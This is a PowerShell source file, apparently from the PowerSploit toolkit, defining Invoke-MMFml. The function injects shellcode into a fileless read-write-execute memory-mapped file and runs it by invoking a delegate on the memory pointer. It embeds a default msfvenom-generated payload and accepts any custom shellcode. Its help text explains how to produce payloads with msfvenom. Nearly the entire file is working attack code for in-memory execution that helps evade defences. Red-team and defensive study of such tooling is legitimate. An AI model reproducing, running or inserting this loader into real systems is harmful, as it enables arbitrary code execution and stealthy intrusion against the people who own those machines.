function Invoke-MMFml {
<#
.SYNOPSIS
Inject shellcode into a Fileless Memory Mapped File, and pass execution from the current Powershell thread to that location in memory..
PowerSploit Function: Invoke-MMFml
Authors: Parker Crook (@crooksecurity), Ben Holder (@soapaid)
License: BSD 3-Clause
Required Dependencies: Powershell 5+; 64-bit shellcode; 64-bit architecture
Optional Dependencies: None
 
.DESCRIPTION

PowerShell expects shellcode to be in the form 0xXX,0xXX,0xXX. To generate your shellcode in this form, you can use msfvenom, and specify the output format 'powershell',
e.g.: msfvenom -p windows/x64/exec CMD="cmd.exe -c calc.exe" -f powershell
 
.PARAMETER Shellcode
Specifies an optional shellcode passed in as a byte array

.EXAMPLE
C:\PS> Invoke-MMFml

Description
-----------
Inject shellcode into the running instance of PowerShell.

.EXAMPLE
C:\PS> Invoke-MMFml -Shellcode @(0x90,0x90,0xC3)
Description
-----------
Overrides the shellcode included in the script with custom shellcode - 0x90 (NOP), 0x90 (NOP), 0xC3 (RET)
#>
[CmdletBinding( DefaultParameterSetName = 'RunLocal', SupportsShouldProcess = $True , ConfirmImpact = 'High')] Param (
    [Parameter( ParameterSetName = 'RunLocal' )]
    [ValidateNotNullOrEmpty()]
    [Byte[]]
    $Shellcode,
    
    [Switch]
    $Force = $False
)

    Set-StrictMode -Version 2.0

    #Function from Matt Graeber (@mattifestation), from https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-Shellcode.ps1.
    function Get-DelegateType
    {
        Param
        (
            [OutputType([Type])]
            
            [Parameter( Position = 0)]
            [Type[]]
            $Parameters = (New-Object Type[](0)),
            
            [Parameter( Position = 1 )]
            [Type]
            $ReturnType = [Void]
        )

        $Domain = [AppDomain]::CurrentDomain
        $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
        $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
        $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
        $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
        $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
        $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
        $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
        $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
        Write-Output $TypeBuilder.CreateType()
    }

    function Get-ShellCode
    {
        param(
            [Parameter(Mandatory=$false)][Byte[]]$shellcodeBase
        )
        # Shellcode Stub 
        $shellcode = [byte[]] @(0x41,0x54,0x41,0x55,0x41,0x56,0x41,0x57,
                            0x55,0xE8,0x0D,0x00,0x00,0x00,0x5D,0x41,
                            0x5F,0x41,0x5E,0x41,0x5D,0x41,0x5C,0x48,
                            0x31,0xC0,0xC3)
        if(!($shellcodeBase)){
            # This shellcode is the default payload used if none is specified
            # This shellcode was created using - msfvenom -p windows/x64/exec CMD="cmd.exe -c calc.exe" -f powershell
            $shellcodeBase =  [byte[]] @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xc0,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52,0x51,
                                0x56,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,
                                0x20,0x48,0x8b,0x72,0x50,0x48,0x0f,0xb7,0x4a,0x4a,0x4d,0x31,0xc9,0x48,0x31,0xc0,
                                0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,
                                0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x8b,0x80,0x88,
                                0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x50,0x8b,0x48,0x18,0x44,
                                0x8b,0x40,0x20,0x49,0x01,0xd0,0xe3,0x56,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,
                                0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0xac,0x41,0xc1,0xc9,0x0d,0x41,0x01,0xc1,
                                0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,0xd8,0x58,0x44,
                                0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,
                                0x01,0xd0,0x41,0x8b,0x04,0x88,0x48,0x01,0xd0,0x41,0x58,0x41,0x58,0x5e,0x59,0x5a,
                                0x41,0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,
                                0x59,0x5a,0x48,0x8b,0x12,0xe9,0x57,0xff,0xff,0xff,0x5d,0x48,0xba,0x01,0x00,0x00,
                                0x00,0x00,0x00,0x00,0x00,0x48,0x8d,0x8d,0x01,0x01,0x00,0x00,0x41,0xba,0x31,0x8b,
                                0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0xba,0xa6,0x95,0xbd,0x9d,0xff,
                                0xd5,0x48,0x83,0xc4,0x28,0x3c,0x06,0x7c,0x0a,0x80,0xfb,0xe0,0x75,0x05,0xbb,0x47,
                                0x13,0x72,0x6f,0x6a,0x00,0x59,0x41,0x89,0xda,0xff,0xd5,0x63,0x61,0x6c,0x63,0x00)
        }
        $shellcode += $shellcodeBase
        #Add RET to attempt to prevent Powershell from crashing when exiting
        $shellcode += [byte[]]@(0xC3)
        return $shellcode
    }    
    
    $enc = [System.Text.Encoding]::UTF8 #using UTF8 means bytewise translation is 1:1 for size.

    $shellcode = Get-ShellCode($shellcode)

    #Create MMF w/ RWX & length of shellcode, with MMF name 'exe'
    [System.IO.MemoryMappedFiles.MemoryMappedFile]$mmfml = [System.IO.MemoryMappedFiles.MemoryMappedFile]::CreateNew([string]'exe', [long]$shellcode.length,
    [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute, [System.IO.MemoryMappedFiles.MemoryMappedFileOptions]::None, 
    [System.IO.MemoryMappedFiles.MemoryMappedFileSecurity]::new(), [System.IO.HandleInheritability]::Inheritable)

    #Create MMF View Stream & write contents of shellcode to the MMF via the View Stream
    $view = $mmfml.CreateViewStream(0,0)
    $view.Write($shellcode, 0,$shellcode.length)
    $view.Position = 0

    #Create View Accessor, get shellcode memory location using DangerousGetHandle()
    $acc = $mmfml.CreateViewAccessor(0,0, [System.IO.MemoryMappedFiles.MemoryMappedFileAccess]::ReadWriteExecute)
    $memhandle = $acc.SafeMemoryMappedViewHandle.DangerousGetHandle()
    #returns shellcode memory location...
    Write-Host "Executing payload at:"
    Write-Host 0x$($memhandle.ToString("X$([IntPtr]::Size*2)"))""

    #Build a Delegate & Invoke from Pointer
    $ByRefDelegate = Get-DelegateType @([IntPtr].MakeByRefType()) ([Void])
    $ByRef = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($memhandle, $ByRefDelegate)
    $ByRef.Invoke([ref]$memhandle)
}
